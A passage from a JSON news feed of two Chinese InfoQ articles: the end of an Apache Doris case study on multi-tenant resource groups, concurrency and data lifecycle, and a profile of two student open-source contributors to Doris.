href=\"https://mp.weixin.qq.com/s?__biz=Mzg3Njc2NDAwOA==&amp;mid=2247514115&amp;idx=1&amp;sn=e009656026c1a7eb64a345d651ce7f49&amp;chksm=cf2fb604f8583f12379675d5df9885dd84573d8c9d373606888f698045dc26ef63bca9b565be&amp;token=2062446849&amp;lang=zh_CN#rd\">一文教你玩转 Apache Doris 分区分桶新功能｜新版本揭秘</a>\"</p><p></p><h2>多租户和资源隔离方案</h2><p></p><p>在 SaaS 业务场景中，多租户和资源划分是架构设计过程中必不可少的部分。多租户（Multi-Tenancy ）指的是单个集群可以为多个不同租户提供服务，并且仍可确保各租户间数据隔离性。通过多租户可以保证系统共性的部分被共享，个性的部分被单独隔离。</p><p></p><p>对于我们来说，客户规模差异较大，有月单量只有 1 万的小客户，也有月单量高达千万级别的大客户，资源的合理分配与隔离在这样的场景下异常重要。如果为每个租户创建一个数据库集群，则集群规模不可控且造成资源浪费。如果多个租户共享一套数据库集群，用户的需求可以相互补偿，总体来时可以有很大的资源节约，并且计算规模越大成本越低，而在应对客户查询时，可以根据客户的数据规模和查询需求将资源池划分给各客户。</p><p></p><p>这里我们采用了 Apache Doris 的节点资源组来区分大小客户，避免了不同租户以及查询间的资源抢占问题。</p><p></p><p>节点资源组划分</p><p></p><p>节点资源划分指将一个 Doris 集群内的 BE 节点设置标签（Tag），标签相同的 BE 节点组成一个资源组（Resource Group），资源组可以看作是数据存储和计算的一个管理单元。数据入库的时候按照资源组配置将数据的副本写入到不同的资源组中，查询的时候按照资源组的划分使用对应资源组上的计算资源对数据进行计算。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/17/17f1f87a65b96de2626f564a397035a2.png\" /></p><p></p><p>例如我们将一个集群中的 3 个 BE 节点划分为 2 个资源组，分别为资源组 A 和资源组 B，BE-1 和 BE-2 属于资源组A，BE-3 属于资源组B。资源组 A 有 2 副本的数据，资源组 B 有一个副本的数据。那么当客户 A 在写入数据和查询数据的时候会按照资源组配置使用资源组 A 上的存储和计算资源，当客户 B 写入数据和查询数据的时候会按照资源组配置使用资源组 B上 的存储和计算资源。这样便能能很好的实现同一个集群，为不同租户提供不同的负载能力。</p><p></p><p>具体操作如下：</p><p></p><p>设置标签：</p><p></p><p>为 BE 节点设置标签。假设当前 Doris 集群有 3 个 BE 节点。分别为 host[1-3]。在初始情况下，所有节点都属于一个默认资源组（Default）。</p><p></p><p>我们可以使用以下命令将这6个节点划分成3个资源组：group_a、group_b：</p><p></p><p><code lang=\"text\">  alter system modify backend \"host1:9050\" set (\"tag.location\" = \"group_a\");\n  alter system modify backend \"host2:9050\" set (\"tag.location\" = \"group_a\");\n  alter system modify backend \"host3:9050\" set (\"tag.location\" = \"group_b\");\n</code></p><p></p><p>这里我们将 host[1-2] 组成资源组 group_a，host[3] 组成资源组 group_b。</p><p></p><p>设置资源组数据分配策略</p><p></p><p>副本分布策略定义：资源组划分好后，我们可以将客户数据的不同副本分布在不同资源组内。假设一张用户表 UserTable。我们希望资源组 A 内存放 2 个副本，资源组 B 存放 1 分副本</p><p></p><p><code lang=\"text\">  create table UserTable (k1 int, k2 int)\n  distributed by hash(k1) buckets 1\n  properties(\n      \"replication_allocation\"=\"tag.location.group_a:2, tag.location.group_b:1\"\n  )\n</code></p><p></p><p>资源组绑定：通过设置客户的资源组使用权限，来限制某一客户的数据导入和查询只能使用指定资源组中的节点来执行。</p><p></p><p><code lang=\"text\">  set property for 'user_a' 'resource_tags.location' = 'group_a';\n  set property for 'user_b' 'resource_tags.location' = 'group_b';\n</code></p><p></p><p>这里将 user_a 和 group_a 资源绑定，user_b 和 group_b 资源绑定。绑定完成后，user_a 在发起对 UserTable 表的查询时，只会访问 group_a 资源组内节点上的数据副本，并且查询仅会使用 group_a 资源组内的节点计算资源。</p><p></p><p>通过 Apache Doris 提供多租户和资源隔离方案，能够将集群资源更合理的分配给各 客户 ，可以让多租户在同一 Doris 集群内进行数据操作时，减少相互之间的干扰，同时达到资源成本的有效降低。</p><p></p><h2>高并发场景的支持</h2><p></p><p>高并发也通常是 <a href=\"https://www.infoq.cn/minibook/8GF06Y8cWJ0bef2q52uP\">SaaS</a>\" 服务场景面临的挑战，一方面是慧经营已经为众多客户提供了分析服务，需要去同时承载大规模客户的并发查询和访问，另一方面，在每日早晚业务高峰期也会面临更多客户的同时在线，通常 QPS 最高可达数千，而这也是 Apache Doris 表现得非常出色的地方。在上游 Flink 高频写入的同时，Apache Doris 表现极为平稳，随着查询并发的提升，查询耗时相较于平时几乎没有太大的波动。</p><p></p><p>应对高并发场景的关键在于利用好分区分桶裁剪、索引、缓存等系统机制来减少底层数据扫描。在 Doris 中会将数据表的前几列作为排序键来构建前缀索引，同时还有 ZoneMap 以及 Bloom Filter 等索引。在执行查询时，通过分区分桶裁剪以及索引可以快速过滤到不在查询范围内的数据，减少 CPU 和 IO 的压力。</p><p></p><p>在与社区的沟通中还了解到，即将发布的新版本还将进一步提升并发支持，引入行存储格式、短路径优化以及预处理语句等来实现上万 QPS 的超高并发，可以满足更高并发要求的 Data Serving 场景，这也是我们十分期待的功能。</p><p></p><h2>数据生命周期管理</h2><p></p><p><img src=\"https://static001.geekbang.org/infoq/9e/9ed06a041bc14e415044a115c6f1ce77.png\" /></p><p></p><p>我们自研了一套生命周期管理工具，基于资源的分配，可以提供客户级定制化冷却策略。根据各个业务场景的客户需求及付费情况，提供不同长度的数据保留策略，同时得益于<a href=\"https://www.infoq.cn/article/ve1ZIGW6fCjw4LMhjeOf\"> Apache Doris</a>\" 提供的 OutFile 功能，实现删除或者导出 S3 两种冷却方式，当我们再次需要这些数据时，可通过 Load 的方式从 S3 导回数据。</p><p></p><p>除了通过 OutFile 将数据文件导出至 S3 以外，社区在后续版本中还将提供分区级别的冷热数据分离策略。当前我们数据分区都是基于日期范围来设置，因此可以利用时间分区进行冷热数据的划分。通过配置分区级别的 Freeze Time，转冷后的历史数据可以自动下沉至成本更低的对象存储上。在面对历史冷数据的查询时，Doris 会自动拉取对象存储上的数据并在本地 Cache 以加速查询，而无需执行导入操作。通过冷热数据分离以及冷数据 Cache，既能保证最大程度的资源节省，也能保证冷数据的查询性能不受影响。</p><p></p><h1>总结规划</h1><p></p><p></p><h2>收益</h2><p></p><p>引入 Apache Doris 之后，新架构的整体查询响应速度都有了较大的提升， 存储成本显著降低，后续我们将继续探索 Doris 新特性，进一步实现降本增效。</p><p></p><h2>规划</h2><p></p><p>目前正在强化 Apache Doris 的元数据管理建设，我们希望通过该服务能更好的协助开发人员使用 Doris，包括数据血缘追踪等；尝试使用更多 Apache Doris 的新功能，在 1.2.0 版本中新增的 Java UDF 功能可以极大降低数据出入库的频率，更便捷地在 Doris 内部进行数据 ETL，这一功能我们正在尝试使用中；探索更好的资源分配方案，包括 SQL 代理以及尝试 Doris 后续提供的 Spill 功能，以更好进行资源分配应用。</p><p></p><p>最后，再次感谢 Apache Doris 社区和 SelectDB 技术团队在我们使用过程中提供的许多指导和帮助，提出问题都会及时的响应并尽快协助解决，未来我们也希望深度参与到社区建设中，为社区的发展出一份力。</p><p></p><p>作者介绍： </p><p></p><p>马成，慧策 JAVA高级研发工程师</p>",
    "publish_time": "2023-03-16 17:12:52",
    "source": {
      "name": "infoq_recommend",
      "desc": "InfoQ推荐",
      "icon": "https://raw.githubusercontent.com/maguowei/today/master/imgs/icon/infoq.png"
    }
  },
  {
    "title": "开源新生代的成长之路：从校园到开源，需要迈过哪些挑战？",
    "url": "https://www.infoq.cn/article/KQNz9Qm608B41QxzIHcY",
    "summary": "<p>#17176 （https://github.com/apache/doris/issues/17176） 在 Apache Doris 社区是一个特殊的存在。跟大多开源社区相似的地方在于，这属于社区为了吸引更多新生力量参与而设置的 Good First Issue。不同的地方在于，新生力量对于参与开发任务的热情超乎想象，每一批新任务的公开就如同春运期间火车票的发售——可能迟了一小会儿，就与心仪的任务擦肩而过。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/80/80407b7b6930dbc4bb8c9a2c3eb48b50.png\" /></p><p></p><p>Issue 发起人是廉玉康（GitHub id：Yukang-Lian），一名来自哈尔滨工业大学深圳校区的研二学生，2022 年开源之夏<a href=\"https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2651144382&amp;idx=2&amp;sn=f68fbb961662c9519f4b283b62b877e1&amp;chksm=bdb8b8ed8acf31fb1eaf32df37651ced02d4a01d99f7fb81170d38a99320c1435017028cf1eb&amp;scene=27#wechat_redirect\"> Apache Doris 社区</a>\"项目的参与者之一。或许玉康同学从未想到，一次偶然的机会，会将他的成长经历与许多身处异地素未谋面却志同道合热爱开源的同路人串联在一起。这其中也包含了唐思阳（GitHub id：TangSiyang2001），来自中南大学人工智能专业的在读学生，怀抱着无限热情立志在开源世界贡献自己的力量。也正是因为在社区的相遇，会让他坚定地在开源世界中探索。</p><p></p><p>2023 年开源之夏再次启程，我和两位同学聊了聊，希望诸位可以听听他们的社区成长故事。</p><p></p><h3>从校园到开源</h3><p></p><p>与步入真实职场所不同，学校的课程学习中接触的知识大都是抽象而离散的，以理论知识居多，很难有机会将它们进行工程化的整合。而当一个成熟的、可供实际生产使用的项目呈现在面前时，往往学校所授予的知识是远远不够的，也是一种截然不同的体验。</p><p></p><p>玉康很认同这一点，他之前参加过几次国外的公开课，写过一些 Project。而面对 Apache Doris 这样一个实际生产应用的项目，相较于课程项目来说，规模和难度都不可一并语之，具体体现在：</p><p></p><p>代码的严谨性与复杂性。课程 Project 代码总行数往往在数千行左右，相比之下 Apache Doris 有着近百万的代码、包含<a href=\"https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2651140026&amp;idx=1&amp;sn=975eca537f138a3526aa4a50b58ab3fa&amp;chksm=bdb8d7e98acf5eff6d777b5db5604670c81e76c3cc53fd6b12f1d9173e76ad85a7aeb7a44105&amp;scene=27#wechat_redirect\">C++/Java</a>\" 等多门语言，庞大的代码量需要在结构复杂且逻辑抽象的同时令人易于理解是十分不易的，同时还需要兼顾内存管理及系统最终性能表现，这对工程师的 Coding 能力是极高的。而在课程学习中考虑的就相对单一，仅需考虑如何实现即可。项目的稳定性与测试的完整性。对于能够支持实际生产的项目，稳定性是重中之重。为了保证运行稳定，需要引入各种实际生产场景的测试 Case，从单元测试到回归测试，每一个 PR 都要经过测试流水线的检验以及 Reviewer 的评审才能合入。在开发过程中，玉康也逐渐开始大量写测试 Case 来覆盖更多场景，以保证开发功能的正确性，这个过程非常提升自身工程能力。相比之下课程中的 Case 就不那么完整、质量相对也不是太高。与工业前沿接轨。时代在不断发展，很多前沿的论文在不断发表，但这些论文的工程实现与落地非常困难，通常一个想法在多年后工业界才会实现。而 Apache Doris 社区对科研前线关注程度非常大，去年启动重构的查询优化器和向量化执行引擎项目就是业界前沿论文的实际工程落地，这也使得 Apache Doris 在性能上取得飞跃性进步。对于学生群体来说，有机会能阅读到这部分源码无疑对论文和前沿趋势的理解更加深入。</p><p></p><p>思阳同学同样意识到了这一点，每一行<a href=\"https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2651145285&amp;idx=2&amp;sn=0448318ba595d6114a00808dcf17d793&amp;chksm=bdb8bc168acf35000ae48af901fb531e6a002cef9decfeb103c09260553c1aded55e5177550e&amp;scene=27#wechat_redirect\">代码</a>\"的敲打都需要思考实现是不是清晰的、可维护的、可验证的、易扩展的......开源社区中的代码除了需要自己的认可，更需要经由同行前辈的评审并通过广大用户群体的考验。这和以往自己作为唯一的作者和 Maintainer 的项目相比都非常不同，挑战性、成就感和技术上获得的提升都有着质的飞跃。参与开源社区可以接触到很多课堂上从未学过的知识，参与<a href=\"https://www.infoq.cn/article/ve1ZIGW6fCjw4LMhjeOf\"> Apache Doris</a>\" 社区的实际感受来看，刷新了自身对 SQL 执行引擎的认知，突破了课堂上学习的 Volcano Model，认识到了 Pull-based 和 Push-based 的差异，认识到了Vectorized Execution Engine……这些知识以前虽有耳闻，但终究不如实际的设计文档和工程例子来得生动具体。</p><p></p><h3>初印象</h3><p></p><p>“说起来纯属偶然，我是在开源之夏的众多<a href=\"https://www.infoq.cn/video/s9FQYQG6hwfBRW5ExJOl\">数据库</a>\"项目中随手挑了一个 Logo 简洁好看的开源项目，恰巧就是 Apahce Doris。”玉康同学这样讲到。最初在开源之夏申请开源项目时，玉康同学对 Doris 的了解还比较有限，查阅资料后了解到 Doris 与他未来立志从事的数据库领域十分契合，于是抱着试一试的心态联系了导师杨勇强（GitHub id：dataroaring），对于不明白的地方一直秉承主动提问、穷追不舍的态度，正是凭借锲而不舍的精神才赢得了开源世界的入场门票。</p><p></p><p>相对于廉玉康的缘分使然，唐思阳的选择显得自有定数。一方面，是在日常学习和实践中接触了大量的开源项目，了解过许多开源社区的工作模式、也学习过许多开源项目的源码，但是另一方面，自身却从来没有亲身参与到开源的建设中，一直处于好奇、观望的状态，但开源开放、自由、理想化的协作模式一直深深吸引着他。</p><p></p><p>也正是因为有类似 GSoC<a href=\"https://www.infoq.cn/article/aIVqNVKl6VJuHLqqaAs1\"> 谷歌</a>\"编程之夏和 OSPP 开源之夏之类面向学生的开源活动，帮助学生可以寻找到参与开源的契机。恰巧那段时间思阳同学正在学习 OLAP 相关的知识，因此尝试在社区的 Good First Issue 留言领取任务，也正是这条留言，玉康同学成为了思阳同学在社区第一个接触的开发者，在深入的沟通交流后，思阳同学对 Apache Doris 社区也有了进一步的认识。对于思阳同学来说，Apache Doris 社区不仅欢迎新鲜血液的加入，还不断推出一些开发任务供学生开发者完成，这对学生群体参与开发十分友好，这也坚定了他持续贡献的决心。</p><p></p><p>值得一提的是，加入社区以来，玉康同学也在向思阳同学分享了许多学习经验和技术成长经历，给予了他很大的启发与帮助。</p><p></p><h3>第一个 PR 的合入</h3><p></p><p>对于志在参与开源社区的学生而言，第一个 PR 的成功合入至关重要，这不仅代表成功迈入开源世界，还将是未来继续参与社区开发的莫大激励。</p><p></p><p>刚开始加入社区接触的 PR 都比较简单，虽然第一个 PR 的代码量只有不到 100 行，却正式将玉康同学引入开源之路。而思阳同学则是将 <a href=\"https://www.infoq.cn/article/L1oIV0GORfNfuysaHfL4\">GitHub</a>\" 头像第一次出现在项目主页的短暂瞬间截图记录了下来。或许对于社区的许多开发者来说这样的画面司空见惯，但作为第一次参与贡献的他来讲，确实有一种神奇又美妙的体验感。也许多年以后回头看到这出发里程碑，也会为当年初出茅庐的自己感到欣慰——参加开源，成为 Doris 社区的一份子，是他心中在大学生涯做过最有意义的事情之一。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/3a/3a8767d7080091a69e3478cbc6ce6f12.jpeg\" /></p><p></p><p>或许有很多同学同样期待通过开源社区来提升自己，却苦于无从下手，对此思阳同学有不少想法。</p><p></p><p>首先要找到适合自己的社区，可以根据自己的学习方向先大致过滤出合适的领域，其次根据<a href=\"https://www.infoq.cn/minibook/EA3IfyXsCLTzSzJNc10z\">开源</a>\"社区的活跃程度、文档建设、协作形式进一步筛选合适的社区。再进一步，观察社区是否对新手友好，比如 Good First Issue 标签下 的 Issue 数量、难度以及时间分布、回应的积极程度，这些都是非常可靠的指标。</p><p></p><p>在进入社区后，可以尝试积极地沟通。遇到困难时首先尝试自行思考、检索予以解决，解决不了的情况下将问题清晰地描述出来、提供充分的有效的辅助信息，向 Mentor 提问、向社区报告，积极寻求解决方法。</p><p></p><p>勇于踏出第一步是至关重要的。毕竟自己也因为观望而错过了许多参与开源的机会。之前也害怕以前从来没开发过 OLAP 系统、没有足够的相关知识的储备，甚至对项目的代码都不太熟悉，害怕不能胜任这些任务。但是来到 Apache Doris 社区后发现，我们的新手任务对知识储备并没有想象中那么深的要求，甚至有些任务和 OLAP 甚至并无联系，比如实现一个简单的 SQL Function、做个简单的日志改善、实现一些 HTTP 接口等，也只需要熟悉相关的开发语言便可上手。即便遇到了困难，也有 Mentor 来指导帮助我们。</p><p></p><p>实际上，下定决心的第一步才是最难的一步，“敌人都是纸老虎”。</p><p></p><h3>路漫漫其修远兮</h3><p></p><p>乔治马洛里说，“因为山在哪里”。参与开源亦是如此，尽管过程中不可避免存在艰难险阻，但每完成一项任务就如同登上一座险峰，即享受凌绝顶的成就感，也期待开启新的征程。</p><p></p><p>玉康同学印象最深刻的任务就是 SSL 的加密传输，这也是第一个独立实现的功能/模块，完成灵感落地。独立做一件事情的时候，需要考虑的东西很多，比如如何兼顾代码的简洁与功能的完整、如何不破坏之前的代码结构，如何不影响内存与性能等等，这项任务大约持续了 1 个月的时间，期间遇到了许多困难与 Bug，除了需要不断查阅、学习相关代码与资料，还要与社区同学多多沟通、思想的碰撞会带来火花。前辈的经验和建议是值得参考和借鉴的，也正是因为有着前辈的支持和鼓励，才支撑他独立完成了功能开发。</p><p></p><p>这艰难的过程让他收获了前所未有的能力成长，熟悉了社区分布式协作的流程，包括提交 PR、Review、修改再到最后的合入流程，同时对大型工程项目的理解加深了许多。现在的他读代码和理解代码的速度相比较之前有了非常大的提升。</p><p></p><p>思阳同学同样遭遇了不少棘手的问题，首当其冲的就是 BRPC-http 这项 Task，这也是思阳同学承接的第二个Task，目的是在 BE 端用 BRPC 实现 http-server 以取代原先基于 libevent 的 http-server。原本并非是一项困难的任务，但在实际项目过程中遭遇了多方面的挑战：</p><p></p><p>其一，在回归测试的过程中碰到了许多麻烦——难以模拟的前置条件、难以获取的元数据、难以复现的、只会在线上的 P0 流水线才会触发的crash......几乎花了实现周期2-3倍的时间，最后在 Mentor 勇强的指点下才顺利完成了绝大多数的测试；其二，在实现这一 Feature 的期间，恰好社区另一位开发者需要实现 https 和鉴权功能，工作内容产生重叠，其间面临了协调与合作的考验，最终通过积极沟通顺利解决了这问题；其三，也是目前正在攻克的一项难题：由于 BRPC 的 http 实现不满足当前需求，为了圆满地完成迁移必须对 brpc 本身增加 server-end-progressive-reader 的 Feature。Mentor 勇强甚至直接联系了 BRPC 的作者之一，为这个 Feature 的实现做指导。目前这个工作仍在持续沟通和推进中，也期待思阳同学能够圆满地完成这项工作。</p><p></p><p>不知不觉，从思阳同学第一次正式参与社区贡献已经数月，其间完成了 5 个 Task、合入了 9 个 PR ，目前也仍然在为下一个 Task 和 PR持续努力着。这些在开源的旅途伊始踏下的或深或浅的脚印，也成为人生经历中不可或缺的一段收获。</p><p></p><p>这里不约而同，他们也想通过这次机会向 Mentor 勇强、正宇（GitHub id：freemandealer）以及其他导师表示感谢。Mentor 在代码 Review 时提出过许多严格又中肯的建议，也指导和推动了许多功能的实现，在遭遇问题时总能作为 Problem Killer 为他们答疑解惑，即便有时候只是些奇怪的或不合理的想法，也总能耐心地解答。同时也在开发习惯上提供了许多宝贵的建议，并为学生们提供了开发机解决了后顾之忧，使得大家能够毫无顾虑的进行任务开发。</p><p></p><h3>精彩无限的未来</h3><p></p><p>时至如今，从玉康同学接触 Apache Doris 社区已经有近一年的时间。在短暂的时间里，他从一个常常提出问题的开源初学者，成长为可以为新鲜血液答疑解惑、可独立实现 Feature 的活跃贡献者。不仅技术上收获巨大的成长，更是结识了一群志同道合的小伙伴，接触了许多业界资深工程师，视野得到极大拓宽。对他而言，开源给了他一个走出舒适区的机会，能够不满足于当下、不断成长。</p><p></p><p>参与开源的这段历程也给了思阳同学不同程度的收获及感悟：从学习的角度来看，参与开源可以印证在校学习过的知识，此前阅读过的一些 Paper 的内容都能在 Doris 中找到踪迹，而通过 Doris 也能找到更多同方向的、更深入的资料进行学习。其次对工程能力的提升也十分显著，唐思阳明显感受到阅读、理解代码的能力比起以前有了不小的提升，开发、调试的技巧也有了不小的改善。从就业的角度来看，开源社区提前给了学生开发者最真实的职场体验，这份体验不只是协作沟通及能力的提升，还可以通过尝试开源帮助他们明确未来的职业方向。</p><p></p><p>身处在信息爆炸的时代，身边充斥了太多资讯，要想得到某个信息其实非常简单，只不过看自己是否愿意去努力寻找，更关键的在于是否愿意走出舒适区。如果有幸能找到自己愿意持之以恒的方向，请不要吝啬付出，因为可收获的更多，人生有无限可能。</p><p></p><p>值此 2023 年开源之夏启动之际，希望用切身感受告诉大家，“参与开源是一种成长，是一种历练，也是一种爱好，是一种理想的寄托”，也更多期待并肩作战的你。</p><p></p><p>嘉宾j简介：</p><p></p><p>廉玉康：哈尔滨工业大学（深圳） 控制科学与工程专业 硕士研究生（在读）</p><p></p><p>唐思阳：中南大学 人工智能专业 大三年级（在读）</p>",
    "publish_time": "2023-03-16 17:19:31",
    "source": {
      "name": "infoq_recommend",
      "desc": "InfoQ推荐",
      "icon": "https://raw.githubusercontent.com/maguowei/today/master/imgs/icon/infoq.png"
    }
  }
]